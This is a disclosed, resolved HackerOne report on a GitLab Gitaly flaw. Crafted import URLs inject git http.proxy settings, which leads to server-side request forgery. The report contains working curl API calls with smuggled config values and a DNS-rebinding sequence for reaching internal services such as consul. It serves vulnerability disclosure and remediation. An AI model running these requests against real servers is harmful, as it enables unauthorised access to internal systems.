# [H] Injection of `http.<url>.*` git config settings leading to SSRF

## Summary
Severity: High
Program: GitLab
Weakness: Server-Side Request Forgery (SSRF)
Reporter: vakzz
State: resolved
Disclosed: 2020-09-08T13:46:02.172Z
Source: https://hackerone.com/reports/855276

## Details
### Summary

When import a repo with credentials via a URL, gitaly generates the git clone command with a `-c` flag to add the Authorization header:

https://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37
```go
flags = append(flags, git.ValueFlag{Name: "-c", Value: fmt.Sprintf("http.%s.extraHeader=%s", u.String(), authHeader)})
```

Which will create a command such as:
```bash
git clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path
```

The issue is that the url can contain one of the http config values from https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt, which will result the user supplied config being set instead of `extraHeader` (with the `.extraHeader..` being appended to the value).

This allows an attacker to set things like `http.proxy` which can result in a SSRF if they use an import url such as `http://user@google.com/.proxy=http://proxy.aw.rs:8500`


### Steps to reproduce
1. Create a dns entry with a short TTL
1. Start a server listening on the port that you want to hit with the SSRF that always returns `200 OK`, something like {F797777}
1. Create a project with the specially crafted import url: `curl -H "Authorization: Bearer $TOKEN" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'`. This results in the following `.git/config` for the repo:

    ```bash
    sudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
    [core]
        repositoryformatversion = 0
        filemode = true
        bare = true
    [http]
        followredirects = false
    [http "http://google.com/"]
        proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==
    ```
1. Update the dns entry to point to `127.0.0.1` and wait for it to propergate
1. Add a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a `?` to make sure the appended paths are removed: `curl -H "Authorization: Bearer $TOKEN" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'`
1. Check the status of the import to see the result of the SSRF (in this case hitting consul on port 8500)

_Trimmed to 38 lines — full report: https://hackerone.com/reports/855276_
